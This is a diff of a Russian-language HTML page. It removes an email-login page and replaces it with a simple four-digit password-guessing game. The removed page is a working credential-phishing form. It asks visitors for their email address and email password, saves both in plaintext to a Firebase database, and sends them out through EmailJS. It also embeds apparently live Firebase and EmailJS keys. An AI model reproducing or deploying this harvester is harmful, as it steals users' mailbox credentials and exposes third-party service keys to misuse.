@@ -1,209 +1,158 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Вход в акаунт</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: 'Segoe UI', system-ui, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: rgb(146, 146, 146);
-      padding: 20px;
-    }
-    .card {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-      padding: 40px 32px;
-      width: 100%;
-      max-width: 400px;
-    }
-    h1 { font-size: 24px; color: #1a202c; margin-bottom: 8px; text-align: center; }
-    .subtitle { color: #718096; text-align: center; margin-bottom: 28px; font-size: 14px; }
-    label { display: block; font-size: 14px; font-weight: 600; color: #4a5568; margin-bottom: 6px; }
-    input {
-      width: 100%; padding: 12px 14px; border: 2px solid #e2e8f0;
-      border-radius: 8px; font-size: 15px; margin-bottom: 18px;
-      transition: border-color 0.2s; outline: none;
-    }
-    input:focus { border-color: #667eea; }
-    button {
-      width: 100%; padding: 14px; background: #667eea; color: #fff;
-      border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
-      cursor: pointer; transition: background 0.2s;
-    }
-    button:hover { background: #5a67d8; }
-    button:disabled { background: #a0aec0; cursor: not-allowed; }
-    .status { margin-top: 16px; text-align: center; font-size: 14px; min-height: 20px; }
-    .status.success { color: #38a169; }
-    .status.error { color: #e53e3e; }
-    .hidden { display: none; }
-    .spam-warning {
-      margin-top: 14px; padding: 12px 14px; background: #fffaf0;
-      border: 1px solid #f6e05e; border-left: 4px solid #ecc94b;
-      border-radius: 8px; font-size: 13px; color: #744210; line-height: 1.5;
-    }
-    .spam-warning b { color: #975a16; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Генератор пароля</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            text-align: center;
+            width: 350px;
+        }
+        h1 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 12px 25px;
+            font-size: 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            background: #667eea;
+            color: white;
+            transition: 0.3s;
+            margin-bottom: 20px;
+        }
+        button:hover {
+            background: #5568d3;
+        }
+        input {
+            padding: 10px;
+            font-size: 16px;
+            border: 2px solid #ccc;
+            border-radius: 8px;
+            width: 60%;
+            text-align: center;
+            margin-right: 5px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .check-btn {
+            background: #28a745;
+        }
+        .check-btn:hover {
+            background: #218838;
+        }
+        #result {
+            margin-top: 15px;
+            font-size: 16px;
+            font-weight: bold;
+            min-height: 24px;
+        }
+        .success {
+            color: #28a745;
+        }
+        .error {
+            color: #dc3545;
+        }
+        .info {
+            color: #666;
+            font-size: 13px;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Вход в почту</h1>
-    <p class="subtitle">Войдите в почту чтобы продолжить</p>
-
-    <form id="reg-form">
-      <label for="name">Почта</label>
-      <input type="text" id="name" placeholder="" required>
-
-      <label for="nick">Пароль от почты</label>
-      <input type="text" id="nick" placeholder="" required>
-
-      <button type="submit" id="send-btn">Отправить код</button>
-      <p id="status" class="status"></p>
-    </form>
-
-    <div id="code-block" class="hidden">
-      <div class="spam-warning">
-        📩 Если письма нет во «Входящих» — обязательно проверьте папку
-        <b>«Спам»</b> или <b>«Нежелательные»</b>. Письмо могло попасть туда.
-      </div>
-      <label for="code" style="margin-top:18px;">Введите код из письма</label>
-      <input type="text" id="code" placeholder="6-значный код" maxlength="6">
-      <button type="button" id="verify-btn">Подтвердить</button>
-      <p id="code-status" class="status"></p>
+    <div class="container">
+        <h1>🔐 Угадай пароль</h1>
+        <button id="startBtn">Запустить</button>
+        <div id="inputArea" style="display:none;">
+            <input type="text" id="passwordInput" maxlength="4" placeholder="0000" inputmode="numeric">
+            <button class="check-btn" id="checkBtn">Проверить</button>
+        </div>
+        <div id="result"></div>
+        <div class="info" id="info"></div>
     </div>
-  </div>
 
-  <!-- Firebase compat SDK -->
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
-  <!-- EmailJS -->
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        let secretPassword = null;
+        let attempts = 0;
 
-  <script>
-    // ⚙️ Конфиг Firebase
-    const firebaseConfig = {
-      apiKey: "AIzaSyA0FYjnMg30jS9D2jeJ-EVTKt5_UU5PfCw",
-      authDomain: "messenger-c75f6.firebaseapp.com",
-      databaseURL: "https://messenger-c75f6-default-rtdb.europe-west1.firebasedatabase.app",
-      projectId: "messenger-c75f6",
-      storageBucket: "messenger-c75f6.firebasestorage.app",
-      messagingSenderId: "936523368636",
-      appId: "1:936523368636:web:6f4ff89a3871cead4068b9",
-      measurementId: "G-J393C4SFJL"
-    };
+        const startBtn = document.getElementById('startBtn');
+        const checkBtn = document.getElementById('checkBtn');
+        const passwordInput = document.getElementById('passwordInput');
+        const result = document.getElementById('result');
+        const info = document.getElementById('info');
+        const inputArea = document.getElementById('inputArea');
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+        // Генерация 4-значного пароля из цифр (0000-9999)
+        function generatePassword() {
+            return String(Math.floor(Math.random() * 10000)).padStart(4, '0');
+        }
 
-    // ⚙️ Конфиг EmailJS
-    const EMAILJS_PUBLIC_KEY  = "popGxqPJLrqP3ySB4";
-    const EMAILJS_SERVICE_ID  = "service_bmmno0o";
-    const EMAILJS_TEMPLATE_ID = "template_wlrjvkf";
-
-    emailjs.init(EMAILJS_PUBLIC_KEY);
-
-    const form         = document.getElementById('reg-form');
-    const statusEl     = document.getElementById('status');
-    const sendBtn      = document.getElementById('send-btn');
-    const codeBlock    = document.getElementById('code-block');
-    const codeInput    = document.getElementById('code');
-    const verifyBtn    = document.getElementById('verify-btn');
-    const codeStatusEl = document.getElementById('code-status');
-
-    let generatedCode = null;
-
-    function generateCode() {
-      return Math.floor(100000 + Math.random() * 900000).toString();
-    }
-
-    // Отправка кода
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const name = document.getElementById('name').value.trim();
-      const nick = document.getElementById('nick').value.trim();
-
-      if (!name || !nick) {
-        statusEl.textContent = 'Пожалуйста, заполните все поля.';
-        statusEl.className = 'status error';
-        return;
-      }
-
-      sendBtn.disabled = true;
-      statusEl.textContent = 'Отправка...';
-      statusEl.className = 'status';
-
-      // 1) Сохраняем в Firestore
-      try {
-        await db.collection('students').add({
-          email: name,
-          password: nick,
-          createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        startBtn.addEventListener('click', () => {
+            secretPassword = generatePassword();
+            attempts = 0;
+            result.textContent = '';
+            info.textContent = '';
+            inputArea.style.display = 'block';
+            passwordInput.value = '';
+            passwordInput.focus();
+            // Для проверки в консоли (можно удалить)
+            console.log('Секретный пароль:', secretPassword);
         });
-      } catch (error) {
-        console.error('Ошибка Firestore:', error);
-        statusEl.textContent = 'Ошибка сохранения: ' + error.message;
-        statusEl.className = 'status error';
-        sendBtn.disabled = false;
-        return;
-      }
 
-      // 2) Генерируем код
-      generatedCode = generateCode();
+        checkBtn.addEventListener('click', checkPassword);
 
-      // 3) Отправляем письмо через EmailJS
-      const params = {
-        to_email: name,        // 👈 Адрес получателя (введённая почта)
-        user_email: name,      // для отображения в теле письма
-        user_pass: nick,
-        verification_code: generatedCode,
-        sent_at: new Date().toLocaleString('ru-RU')
-      };
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') checkPassword();
+        });
 
-      console.log('Отправляем в EmailJS:', params);
+        function checkPassword() {
+            if (!secretPassword) {
+                result.textContent = 'Сначала нажмите "Запустить"';
+                result.className = 'error';
+                return;
+            }
 
-      try {
-        const result = await emailjs.send(
-          EMAILJS_SERVICE_ID,
-          EMAILJS_TEMPLATE_ID,
-          params
-        );
+            const userInput = passwordInput.value.trim();
 
-        console.log('EmailJS ответил:', result);
-        statusEl.textContent = 'Код отправлен на вашу почту!';
-        statusEl.className = 'status success';
-        codeBlock.classList.remove('hidden');
-      } catch (error) {
-        console.error('Ошибка EmailJS:', error);
-        statusEl.textContent = 'Ошибка отправки кода: ' +
-          (error.text || error.message || JSON.stringify(error));
-        statusEl.className = 'status error';
-      } finally {
-        sendBtn.disabled = false;
-      }
-    });
+            if (!/^\d{4}$/.test(userInput)) {
+                result.textContent = 'Введите 4 цифры';
+                result.className = 'error';
+                return;
+            }
 
-    // Проверка кода
-    verifyBtn.addEventListener('click', () => {
-      const enteredCode = codeInput.value.trim();
-      if (!enteredCode) {
-        codeStatusEl.textContent = 'Введите код.';
-        codeStatusEl.className = 'status error';
-        return;
-      }
-      if (enteredCode === generatedCode) {
-        codeStatusEl.textContent = 'Код верный! Добро пожаловать.';
-        codeStatusEl.className = 'status success';
-      } else {
-        codeStatusEl.textContent = 'Неверный код. Попробуйте снова.';
-        codeStatusEl.className = 'status error';
-      }
-    });
-  </script>
+            attempts++;
+
+            if (userInput === secretPassword) {
+                result.textContent = `✅ Вы ввели верный пароль! (попыток: ${attempts})`;
+                result.className = 'success';
+            } else {
+                result.textContent = `❌ Неверный пароль. Попробуйте ещё раз.`;
+                result.className = 'error';
+                info.textContent = `Попыток: ${attempts}`;
+                passwordInput.value = '';
+                passwordInput.focus();
+            }
+        }
+    </script>
 </body>
 </html>
